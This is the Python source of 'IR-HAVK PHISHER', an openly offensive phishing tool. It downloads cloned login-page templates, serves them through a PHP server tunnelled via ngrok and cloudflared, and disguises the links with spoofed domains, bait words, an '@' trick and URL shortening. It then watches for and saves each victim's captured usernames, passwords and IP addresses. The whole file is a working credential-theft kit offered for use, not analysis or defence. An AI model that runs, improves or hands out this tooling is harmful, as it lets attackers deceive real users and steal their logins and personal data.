# -*- coding: UTF-8 -*-
"""
IR-HAVK PHISHER
"""

from os import popen, system, remove, name as os_name
from os.path import isfile, exists, abspath
from sys import stdout, version_info
from socket import setdefaulttimeout, socket, AF_INET, SOCK_STREAM
from time import sleep
from re import sub
from json import loads
from argparse import ArgumentParser, BooleanOptionalAction
import platform

# Color snippets
black="\033[0;30m"
red="\033[0;31m"
bred="\033[1;31m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
blue="\033[0;34m"
purple="\033[0;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"
white="\033[0;37m"
nc="\033[00m"

version="2.0"

ask  =     f"{green}[{white}?{green}] {yellow}"
success = f"{yellow}[{white}√{yellow}] {green}"
error  =    f"{blue}[{white}!{blue}] {red}"
info  =   f"{yellow}[{white}+{yellow}] {cyan}"
info2  =   f"{green}[{white}•{green}] {purple}"

# FIXED: Made logo raw strings to prevent escape sequence warnings
logo=rf'''
{green}██╗██████╗       ██╗  ██╗ █████╗ ██╗   ██╗██╗  ██╗    ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗ 
{cyan} ██║██╔══██╗      ██║  ██║██╔══██╗██║   ██║██║ ██╔╝    ██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗
{cyan} ██║██████╔╝█████╗███████║███████║██║   ██║█████╔╝     ██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝
{cyan} ██║██╔══██╗╚════╝██╔══██║██╔══██║╚██╗ ██╔╝██╔═██╗     ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗
{cyan} ██║██║  ██║      ██║  ██║██║  ██║ ╚████╔╝ ██║  ██╗    ██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║
{green}╚═╝╚═╝  ╚═╝      ╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚═╝  ╚═╝    ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                            {cyan}[v{version}]
                                                            {red}[By ATHEX BLACK HAT]
'''


pkgs=[ "php", "curl", "wget", "unzip" ]

# Cross-platform detection
is_windows = os_name == 'nt'
is_linux = os_name == 'posix'
is_mac = platform.system() == 'Darwin'

try:
    if is_windows:
        # Windows: Use USERPROFILE
        test = popen("echo %USERPROFILE%")
        root = popen("echo %USERPROFILE%").read().strip()
    else:
        # Linux/Mac
        test = popen("cd $HOME && pwd")
        root = popen("cd $HOME && pwd").read().strip()
except:
    exit()

supported_version = 3

if version_info[0] != supported_version:
    print(f"{error}Only Python version {supported_version} is supported!\nYour python version is {version_info[0]}")
    exit(0)

choice_file = "files/templates.json"

# Check termux
if exists("/data/data/com.termux/files/home"):
    termux=True
else:
    termux=False

# Get package manager
if system("command -v apt > /dev/null 2>&1")==0:
    apt=True
else:
    apt=False
if system("command -v apt-get > /dev/null 2>&1")==0:
    aptget=True
else:
    aptget=False
if system("command -v sudo > /dev/null 2>&1")==0:
    sudo=True
else:
    sudo=False
if system("command -v pacman  > /dev/null 2>&1")==0:
    pacman=True
else:
    pacman=False
if system("command -v yum > /dev/null 2>&1")==0:
    yum=True
else:
    yum=False
if system("command -v dnf > /dev/null 2>&1")==0:
    dnf=True
else:
    dnf=False
if system("command -v brew > /dev/null 2>&1")==0:
    brew=True
else:
    brew=False
if system("command -v apk > /dev/null 2>&1")==0:
    apk=True
else:
    apk=False
    
logo2=rf'''
{green}██╗██████╗       ██╗  ██╗ █████╗ ██╗   ██╗██╗  ██╗    ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗ 
{cyan} ██║██╔══██╗      ██║  ██║██╔══██╗██║   ██║██║ ██╔╝    ██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗
{cyan} ██║██████╔╝█████╗███████║███████║██║   ██║█████╔╝     ██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝
{cyan} ██║██╔══██╗╚════╝██╔══██║██╔══██║╚██╗ ██╔╝██╔═██╗     ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗
{cyan} ██║██║  ██║      ██║  ██║██║  ██║ ╚████╔╝ ██║  ██╗    ██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║
{green}╚═╝╚═╝  ╚═╝      ╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚═╝  ╚═╝    ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                            {cyan}[v{version}]
                                                            {red}[By ATHEX BLACK HAT]
'''

argparser = ArgumentParser()

argparser.add_argument("-p", "--port", type=int, default=8080, help="ir-havk_phisher server port [ Default : 8080 ]")
argparser.add_argument("-o", "--option", default="", help="ir-havk_phisher's template index [ Default : null ]")
argparser.add_argument("--update", help="Check for update", action=BooleanOptionalAction, default=True)

args = argparser.parse_args()
port = args.port
option = args.option
update = args.update

local_url = f"127.0.0.1:{port}"

def sprint(n, t=0.05):
    for word in n + '\n':
        stdout.write(word)
        stdout.flush()
        sleep(t)
def internet(host="8.8.8.8", port=53, timeout=10):
    try:
        setdefaulttimeout(timeout)
        socket(AF_INET, SOCK_STREAM).connect((host, port))
    except:
        print(f"{error}No internet!")
        sleep(2)
        internet()
        
if logo.find("ATHEX BLACK HAT")==-1:
    print(f"{error}Replacing a logo doesn't make you a developer Lol!")
    exit(1)
        
def exception_handler(e, multiline=False, skip=True):
    lines_arr = []
    tb = e.__traceback__
    while tb is not None:
        if tb.tb_frame.f_code.co_filename == abspath(__file__):
            lines_arr.append(str(tb.tb_lineno))
        tb = tb.tb_next
    name = type(e).__name__
    if skip:
        if name == "ModuleNotFoundError" or name == "NameError":
            print(f"{error}Error!")
            return
    message = str(e).split(":")[0]
    line_no = lines_arr[len(lines_arr) - 1]
    lines_no = ", ".join(lines_arr)
    if multiline:
        print(f"{error}{name}: {message} at lines {lines_no}")
    else:
        print(f"{error}{name}: {message} at line {line_no}")

# check if a json is valid
def is_json(myjson):
  try:
    loads(myjson)
    return True
  except ValueError:
    return False

# Polite Exit
def pexit():
    killer()
    sprint(f"\n{info2}Thanks for using!\n{nc}")
    exit(0)


# Install packages in Termux and Mac
def installer(pm):
    for pkg in range(0, len(pkgs)):
        if system(f"command -v {pkgs[pkg]} > /dev/null 2>&1")!=0:
            sprint(f"\n{info}Installing {pkgs[pkg].upper()}{nc}")
            system(f"{pm} install -y {pkgs[pkg]}")

# Install packages in Linux
def sudoinstaller(pm):
    for pkg in range(0, len(pkgs)):
        if system(f"command -v {pkgs[pkg]} > /dev/null 2>&1")!=0:
            sprint(f"{info}Installing {pkgs[pkg].upper()}{nc}")
            system(f"sudo {pm} install -y {pkgs[pkg]}")



# Process killer
def killer():
    if is_windows:
        system("taskkill /F /IM php.exe > nul 2>&1")
        system("taskkill /F /IM ngrok.exe > nul 2>&1")
        system("taskkill /F /IM cloudflared.exe > nul 2>&1")
        system("taskkill /F /IM curl.exe > nul 2>&1")
        system("taskkill /F /IM wget.exe > nul 2>&1")
        system("taskkill /F /IM unzip.exe > nul 2>&1")
    else:
        if system("pidof php > /dev/null 2>&1")==0:
            system("killall php")
        if system("pidof ngrok > /dev/null 2>&1")==0:
            system("killall ngrok")
        if system("pidof cloudflared > /dev/null 2>&1")==0:
            system("killall cloudflared")
        if system("pidof curl > /dev/null 2>&1")==0:
            system("killall curl")
        if system("pidof wget > /dev/null 2>&1")==0:
            system("killall wget")
        if system("pidof unzip > /dev/null 2>&1")==0:
            system("killall unzip")



# Website chooser
def show_options(sites):
    leng=len(sites)
    i=0
    j=int(leng/3)
    k=int((2*leng)/3)
    if leng%3!=0:
        j+=1
        k+=1
    m=j
    while i<m:
        print(f"{green}[{white}{str(i+1)}{green}] {yellow}{sites[i]}", end="")
        lew=len(sites[i])
        sp=22-lew
        if i<9:
            sp=sp+1
        for s in range(sp):
            print(" ",end="")
        print(f"{green}[{white}{str(j+1)}{green}] {yellow}{sites[j]}", end="")
        lew=len(sites[j])
        sp=16-lew
        for s in range(sp):
            print(" ",end="")
        if k<leng:
            print(f"{green}[{white}{str(k+1)}{green}] {yellow}{sites[k]}", end="")
        i+=1
        j+=1
        k+=1
        print()
    print()
    print(f"{green}[{white}x{green}]{yellow} About                  {green}[{white}m{green}]{yellow} More tools       {green}[{white}0{green}]{yellow} Exit")
    print()
    print()


# Info about tool
def about():
    system("clear" if not is_windows else "cls")
    sprint(logo, 0.01)
    print(f"{red}[ToolName]  {cyan} :[ir-havk_phisher] ")
    print(f"{red}[Version]   {cyan} :[{version}] ")
    print(f"{red}[Author]    {cyan} :[ATHEX BLACK HAT] ")
    print(f"{red}[Github]    {cyan} :[https://github.com/Athexblackhat] ")
    print(f"\n{green}[{white}0{green}]{yellow} Exit                     {green}[{white}99{green}]{yellow} Main Menu       \n")
    abot= input("\n > ")
    if abot== "0":
        pexit()
    else:
        main()

def customfol():
    fol=input(f"\n{ask}Enter the directory > {green}")
    mask=input(f"\n{ask}Enter a bait sentence (Example: free-money) > {green}")
    mask = "https://" + sub("(/| )", "-", mask)
    if exists(fol):
        if isfile(f"{fol}/index.php"):
            if is_windows:
                system(f'cd /d "{fol}" && del /f ip.txt usernames.txt 2>nul && xcopy /E /Y * "{root}\\.site\\"')
            else:
                system(f'cd "{fol}" && rm -rf ip.txt usernames.txt && cp -r * $HOME/.site')
            server(mask)
        else:
            sprint(f"{error}Index.php required but not found!")
            main()
    else:
        sprint(f"{error}Directory do not exists!")
        main()


# Update of ir-havk_phisher
def updater():
    internet()
    git_ver=popen("curl -s -N https://raw.githubusercontent.com/Athexblackhat/ir-havk_phisher/main/files/version.txt").read().strip()
    if (version != git_ver and git_ver != "404: Not Found"):
        changelog=popen("curl -s -N https://raw.githubusercontent.com/Athexblackhat/ir-havk_phisher/main/files/changelog.log").read()
        system("clear" if not is_windows else "cls")
        print(logo)
        print(f"{info}ir-havk_phisher has a new update!\n{info2}Current: {red}{version}\n{info}Available: {green}{git_ver}")
        upask=input(f"\n{ask}Do you want to update ir-havk_phisher?[y/n] > {green}")
        if upask=="y":
            print(nc)
            if is_windows:
                system("cd .. && rmdir /S /Q ir-havk_phisher 2>nul & rmdir /S /Q ir-havk_phisher 2>nul & git clone https://github.com/Athexblackhat/ir-havk_phisher")
            else:
                system("cd .. && rm -rf ir-havk_phisher ir-havk_phisher && git clone https://github.com/Athexblackhat/ir-havk_phisher")
            sprint(f"\n{success}ir-havk_phisher has been updated successfully!! Please restart terminal!")
            if (changelog != "404: Not Found"):
                sprint(f"\n{info2}Changelog:\n{purple}{changelog}")
            exit()
        elif upask=="n":
            print(f"\n{info}Updating cancelled. Using old version!")
            sleep(2)
        else:
            print(f"\n{error}Wrong input!\n")
            sleep(2)

def main():
    prerequiments()
    while True:
        if not isfile(choice_file):
            sprint(f"\n{info}Downloading required files.....{nc}")
            internet()
            system(f"wget -q --show-progress https://raw.githubusercontent.com/Athexblackhat/ir-havk_phisher/main/{choice_file} -O {choice_file}")
        system("clear" if not is_windows else "cls")
        sprint(logo, 0.01)
        with open(choice_file, "r") as choice_data:
            local_json = choice_data.read()
            if is_json(local_json):
                sites = loads(local_json)
            else:
                web_json = popen(f"curl -s -N https://raw.githubusercontent.com/Athexblackhat/ir-havk_phisher/main/{choice_file}").read().strip()
                sites = loads(web_json)
            names = []
            choices = []
            masks = []
            folders = []
            for site in sites:
                names.append(site["name"])
                choices.append(site["choice"])
                folders.append(site["folder"])
                masks.append(site["mask"])
            show_options(names)
        if option!="":
            choice = option
        else:
            choice = input(f"{ask}Select one of the options > {nc}")
        if choice != "0" and choice.startswith("0"):
            choice = choice.replace("0", "")
        if choice in choices:
            index = choices.index(choice)
            folder = folders[index]
            mask = masks[index]
            if folder == "custom" and mask == "custom":
                customfol()
            requirements(folder, mask)
        elif choice == "x" or choice == "X":
            about()
        elif choice == "m" or choice == "M":
            if is_windows:
                system("start https://github.com/Athexblackhat/ir-havk_phisher#My-Best-Works")
            else:
                system("xdg-open 'https://github.com/Athexblackhat/ir-havk_phisher#My-Best-Works'")
            main()
        elif choice == "0":
            pexit()
        else:
            sprint(f"\n{error}Wrong input {bred}\"{choice}\"")
            main()

# 2nd function installing packages and downloading tunnelers
def prerequiments():
    internet()
    if termux:
        if system("command -v proot > /dev/null 2>&1")!=0:
            system("pkg install proot -y")
        installer("pkg")
    elif is_windows:
        # Windows: Check for required tools
        print(f"{info}Checking requirements for Windows...{nc}")
        # Check PHP
        if system("where php > nul 2>&1") != 0:
            sprint(f"{error}PHP not found! Please install PHP and add to PATH{nc}")
            exit(1)
        # Check curl
        if system("where curl > nul 2>&1") != 0:
            sprint(f"{error}Curl not found! Please install curl and add to PATH{nc}")
            exit(1)
        # Check wget or use curl as alternative
        if system("where wget > nul 2>&1") != 0:
            sprint(f"{info}Wget not found. Will use curl as alternative{nc}")
        # Check unzip
        if system("where unzip > nul 2>&1") != 0:
            if system("where tar > nul 2>&1") != 0:
                sprint(f"{error}Unzip/tar not found! Please install unzip and add to PATH{nc}")
                exit(1)
    else:
        if sudo and apt:
            sudoinstaller("apt")
        elif sudo and apk:
            sudoinstaller("apk")
        elif sudo and yum:
            sudoinstaller("yum")
        elif sudo and dnf:
            sudoinstaller("dnf")
        elif sudo and aptget:
            sudoinstaller("apt-get")
        elif sudo and pacman:
            for pkg in range(0, len(pkgs)):
                if system(f"command -v {pkgs[pkg]} > /dev/null 2>&1")!=0:
                    sprint(f"\n{info}Installing {pkgs[pkg].upper()}{nc}")
                    system(f"sudo pacman -S {pkgs[pkg]} --noconfirm")
        elif brew:
            installer("brew")
        elif apt:
            installer("apt")
        else:
            sprint(f"\n{error}Unsupported package manager. Install packages manually!{nc}")
            exit(1)
    
    if is_windows:
        # Skip Unix command checks on Windows
        pass
    else:
        if system("command -v php > /dev/null 2>&1")!=0:
            sprint(f"{error}PHP cannot be installed. Install it manually!{nc}")
            exit(1)
        if system("command -v unzip > /dev/null 2>&1")!=0:
            sprint(f"{error}Unzip cannot be installed. Install it manually!{nc}")
            exit(1)
        if system("command -v curl > /dev/null 2>&1")!=0:
            sprint(f"{error}Curl cannot be installed. Install it manually!{nc}")
            exit(1)
    
    killer()
    
    # Setup based on OS
    if is_windows:
        # Create directories
        system(f"if not exist \"{root}\\.ngrokfolder\" mkdir \"{root}\\.ngrokfolder\"")
        system(f"if not exist \"{root}\\.cffolder\" mkdir \"{root}\\.cffolder\"")
        system(f"rmdir /S /Q \"{root}\\.site\" 2>nul & mkdir \"{root}\\.site\"")
    else:
        x=popen("uname -m").read()
        y=popen("uname").read()
        if not isfile(f"{root}/.ngrokfolder/ngrok"):
            sprint(f"\n{info}Downloading ngrok.....{nc}")
            internet()
            system("rm -rf ngrok.zip ngrok.tgz")
            if y.find("Linux")!=-1:
                if x.find("aarch64")!=-1:
                    system("wget -q --show-progress https://github.com/Athexblackhat/ir-havk_phisher/files/raw/main/ngrok/ngrok-stable-linux-arm64.tgz -O ngrok.tgz")
                    system("tar -zxf ngrok.tgz > /dev/null 2>&1 && rm -rf ngrok.tgz")
                elif x.find("arm")!=-1:
                    system("wget -q --show-progress https://github.com/Athexblackhat/ir-havk_phisher/files/raw/main/ngrok/ngrok-stable-linux-arm.zip -O ngrok.zip")
                    system("unzip ngrok.zip > /dev/null 2>&1 ")
                elif x.find("x86_64")!=-1:
                    system("wget -q --show-progress https://github.com/Athexblackhat/ir-havk_phisher/files/raw/main/ngrok/ngrok-stable-linux-amd64.zip -O ngrok.zip")
                    system("unzip ngrok.zip > /dev/null 2>&1")
                else:
                    system("wget -q --show-progress https://github.com/Athexblackhat/ir-havk_phisher/files/raw/main/ngrok/ngrok-stable-linux-386.zip -O ngrok.zip")
                    system("unzip ngrok.zip > /dev/null 2>&1")
            elif y.find("Darwin")!=-1:
                if x.find("x86_64")!=-1:
                    system("wget -q --show-progress 'https://github.com/Athexblackhat/ir-havk_phisher/files/raw/main/ngrok/ngrok-stable-darwin-amd64.zip' -O 'ngrok.zip'")
                    system("unzip ngrok.zip > /dev/null 2>&1")
                elif x.find("arm64")!=-1:
                    system("wget -q --show-progress 'https://github.com/Athexblackhat/ir-havk_phisher/files/raw/main/ngrok/ngrok-stable-arm64.zip' -O 'ngrok.zip'")
                else:
                    print(f"{error}Device architecture unknown. Download ngrok manually!")
                    sleep(3)
            else:
                print(f"{error}Device not supported!")
                exit(1)
            system("rm -rf ngrok.zip && mkdir $HOME/.ngrokfolder")
            system("mv -f ngrok $HOME/.ngrokfolder")
            if sudo:
                system("sudo chmod +x $HOME/.ngrokfolder/ngrok")
            else:
                system("chmod +x $HOME/.ngrokfolder/ngrok")
        if not isfile(f"{root}/.cffolder/cloudflared"):
            sprint(f"\n{info}Downloading cloudflared.....{nc}")
            internet()
            system("rm -rf cloudflared cloudflared.tgz")
            if y.find("Linux")!=-1:
                if x.find("aarch64")!=-1:
                    system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared")
                elif x.find("arm")!=-1:
                    system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared")
                elif x.find("x86_64")!=-1:
                    system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared")
                else:
                    system("wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared")
            elif y.find("Darwin")!=-1:
                if x.find("x86_64")!=-1:
                    system("wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz' -O 'cloudflared.tgz'")
                    system("tar -zxf cloudflared.tgz > /dev/null 2>&1 && rm -rf cloudflared.tgz")
                elif x.find("arm64")!=-1:
                    print(f"{error}Cloudflared not available for device architecture!")
                    sleep(3)
                else:
                    print(f"{error}Device architecture unknown. Download cloudflared manually!")
                    sleep(3)
            else:
                print(f"{error}Device not supported!")
                exit(1)
            system("mkdir $HOME/.cffolder")
            system("mv -f cloudflared $HOME/.cffolder")
            if sudo:
                system("sudo chmod +x $HOME/.cffolder/cloudflared")
            else:
                system("chmod +x $HOME/.cffolder/cloudflared")
        if system("pidof php > /dev/null 2>&1")==0:
            sprint(f"{error}Previous php still running! Please restart terminal and try again{nc}")
            pexit()
        if system("pidof ngrok > /dev/null 2>&1")==0:
            sprint(f"{error}Previous ngrok still running. Please restart terminal and try again{nc}")
            pexit()
        system("rm -rf $HOME/.site && cd $HOME && mkdir .site")


# 3rd function checking requirements and download files 
def requirements(folder, mask):
    if isfile(f"{root}/.websites/version.txt"):
        with open(f"{root}/.websites/version.txt", "r") as sites_file:
            zipver=sites_file.read().strip()
            if zipver!=version:
                sprint(f"\n{info}Downloading required files.....\n")
                system("wget -q --show-progress https://github.com/Athexblackhat/ir-havk_phisher/files/raw/main/websites.zip -O websites.zip")
    else:
        sprint(f"\n{info}Downloading required files.....\n")
        system("wget -q --show-progress https://github.com/Athexblackhat/ir-havk_phisher/files/raw/main/websites.zip -O websites.zip")
    if isfile("websites.zip"):
        if is_windows:
            system(f"rmdir /S /Q \"{root}\\.websites\" 2>nul & mkdir \"{root}\\.websites\"")
        else:
            system(f"rm -rf $HOME/.websites && cd $HOME && mkdir .websites")
        system(f"unzip websites.zip -d {root}/.websites > /dev/null 2>&1")
        remove("websites.zip")
    if exists(f"{root}/.websites/{folder}"):
        if is_windows:
            system(f"xcopy /E /Y \"{root}\\.websites\\{folder}\\*\" \"{root}\\.site\\\"")
        else:
            system(f"cp -r $HOME/.websites/{folder}/* $HOME/.site")
    else:
        internet()
        sprint(f"\n{info}Downloading required files.....\n")
        system("rm -rf site.zip")
        system(f"wget -q --show-progress https://github.com/Athexblackhat/ir-havk_phisher/files/raw/main/phishingsites/{folder}.zip -O site.zip")
        if not exists(f"{root}/.websites/{folder}"):
            if is_windows:
                system(f"mkdir \"{root}\\.websites\\{folder}\"")
            else:
                system(f"cd $HOME/.websites && mkdir {folder}")
        system(f"unzip site.zip -d {root}/.websites/{folder}")
        remove("site.zip")
        if is_windows:
            system(f"xcopy /E /Y \"{root}\\.websites\\{folder}\\*\" \"{root}\\.site\\\"")
        else:
            system(f"cp -r $HOME/.websites/{folder}/* $HOME/.site")
    server(mask)

def server(mask):
    system("clear" if not is_windows else "cls")
    sprint(logo, 0.01)
    if termux:
        sprint(f"\n{info}If you haven't enabled hotspot, please enable it!")
        sleep(1)
    sprint(f"\n{info2}Initializing PHP server at localhost:{port}....")
    internet()
    
    if is_windows:
        system(f"cd /d \"{root}\\.site\" && start /B php -S {local_url} > nul 2>&1")
    else:
        system(f"cd $HOME/.site && php -S {local_url} > /dev/null 2>&1 &")
    
    sleep(2)

    if is_windows:
        check_server = system(f"curl --output nul --silent --head --fail {local_url} 2>nul")
    else:
        check_server = system(f"curl --output /dev/null --silent --head --fail {local_url}")
    
    if not check_server:
        sprint(f"\n{info}PHP Server has started successfully!")
    else:
        sprint(f"\n{error}PHP Error")
        pexit()
    
    sprint(f"\n{info2}Initializing tunnelers at same address.....")
    internet()
    
    if is_windows:
        system(f"del /f \"{root}\\.cffolder\\log.txt\" 2>nul")
        system(f"start /B ngrok http {local_url} > nul 2>&1")
        system(f"start /B cloudflared tunnel -url {local_url} --logfile \"{root}\\.cffolder\\log.txt\" > nul 2>&1")
    else:
        system("rm -rf $HOME/.cffolder/log.txt")
        if system("command -v termux-chroot > /dev/null 2>&1")==0:
            system(f"cd $HOME/.ngrokfolder && termux-chroot ./ngrok http {local_url} > /dev/null 2>&1 &")
            system(f"cd $HOME/.cffolder && termux-chroot ./cloudflared tunnel -url {local_url} --logfile log.txt > /dev/null 2>&1 &")
        else:
            system(f"cd $HOME/.ngrokfolder && ./ngrok http {local_url} > /dev/null 2>&1 &")
            system(f"cd $HOME/.cffolder && ./cloudflared tunnel -url {local_url} --logfile log.txt > /dev/null 2>&1 &")
    
    sleep(9)
    
    if is_windows:

        ngrok_cmd = 'curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\\.ngrok\\.io"'
        ngrok_link = popen(ngrok_cmd).read()
        cf_cmd = f'type "{root}\\.cffolder\\log.txt" 2>nul | grep -o "https://[-0-9a-z]*\\.trycloudflare\\.com"'
        cf_link = popen(cf_cmd).read()
    else:
        # For Linux/Mac
        ngrok_link = popen('curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o \'https://[-0-9a-z]*\\.ngrok\\.io\'').read()
        cf_link = popen('cat $HOME/.cffolder/log.txt | grep -o \'https://[-0-9a-z]*\\.trycloudflare\\.com\'').read()
    
    if ngrok_link.find("ngrok")!=-1:
        ngrok_check=True
    else:
        ngrok_check=False
    
    if cf_link.find("cloudflare")!=-1:
        cf_check=True
    else:
        cf_check=False
    
    if ngrok_check and cf_check:
        url_manager(cf_link, mask, "1", "2")
        url_manager(ngrok_link, mask, "3", "4")
        cuask(cf_link)
    elif not ngrok_check and cf_check:
        url_manager(cf_link, mask,  "1", "2")
        cuask(cf_link)
    elif not cf_check and ngrok_check:
        url_manager(ngrok_link, mask, "1", "2")
        cuask(ngrok_link)
    elif not (cf_check and ngrok_check):
        sprint(f"\n{error}Tunneling failed! Use your own tunneling service on port {port}!{nc}")
        waiter()
    else:
        sprint(f"\n{error}Unknown error!")
        pexit()

def url_manager(url, mask, num1, num2):
    sprint(f"\n{success}Your urls are given below:")
    print(f"\n{info2}URL {num1} > {yellow}{url}")
    print(f"{info2}URL {num2} > {yellow}{mask}@{url.replace('https://','')}")

def cuask(url):
    cust= input(f"\n{ask}{bcyan}Wanna try custom link?(y or press enter to skip) > ")
    if not cust=="":
        masking(url)
    waiter()

def masking(url):
    website = "https://is.gd/create.php?format=simple&url=" + url.strip()
    internet()
    resp = popen(f"curl -s {website} | head -n1").read()
    if not resp.find("https://")!=-1:
        sprint(f"{error}Service not available!\n{resp}")
        waiter()
    short = resp.replace("https://", "")
    domain = input(f"\n{ask}Enter custom domain(Example: google.com, yahoo.com > ")
    if domain=="":
        sprint(f"\n{error}No domain!")
    else:
        domain = sub("(/| )", ".", sub("https?://", "", domain))
        domain = "https://" + domain + "-"
    bait = input(f"\n{ask}Enter bait words with hyphen without space (Example: free-money, pubg-mod) > ")
    if bait=="":
        sprint(f"\n{error}No bait word!")
    else:
        bait = sub("(/| )", "-", bait) + "@"
    final = domain + bait + short
    sprint(f"\n{success}Your custom url is > {bgreen}{final}")
    waiter()

def waiter():
    if is_windows:
        system(f"del /f \"{root}\\.site\\ip.txt\" 2>nul")
    else:
        system("rm -rf $HOME/.site/ip.txt")
    sprint(f"\n{info}{blue}Waiting for login info....{cyan}Press {red}Ctrl+C{cyan} to exit")
    try:
        while True:
            if isfile(f"{root}/.site/usernames.txt"):
                print(f"\n\n{success}{bgreen}Victim login info found!\n\007")
                with open(f"{root}/.site/usernames.txt","r") as ufile:
                    userdata=ufile.readlines()
                    useri=0
                    userlen=len(userdata)
                    while useri<userlen:
                        print(f"{cyan}[{green}*{cyan}] {yellow}{userdata[useri]}",end="")
                        useri+=1
                print(f"\n{info}Saved in usernames.txt")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                if is_windows:
                    system(f"type \"{root}\\.site\\usernames.txt\" >> usernames.txt")
                else:
                    system("cat $HOME/.site/usernames.txt >> usernames.txt")
                remove(f"{root}/.site/usernames.txt")
            sleep(0.75)
            if isfile(f"{root}/.site/ip.txt"):
                print(logo)
                print(f"\n\n{success}{bgreen}Victim IP found!\n\007")
                with open(f"{root}/.site/ip.txt","r") as ipfile:
                    ipdata=ipfile.readlines()
                    ipi=0
                    iplen=len(ipdata)
                    while ipi<iplen:
                        print(f"{cyan}[{green}*{cyan}] {yellow}{ipdata[ipi]}",end="")
                        ipi+=1
                print(f"\n{info}Saved in ip.txt")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                if is_windows:
                    system(f"type \"{root}\\.site\\ip.txt\" >> ip.txt")
                else:
                    system("cat $HOME/.site/ip.txt >> ip.txt")
                system("rm -rf $HOME/.site/ip.txt")
            sleep(0.75)
    except KeyboardInterrupt:
        pexit()

if __name__ == '__main__':
    try:
        if not is_windows:
            system("stty -echoctl") 
        if update:
            updater()
        main()
    except KeyboardInterrupt:
        pexit()
    except Exception as e:
        try:
            exception_handler(e)
        except:
            exit()
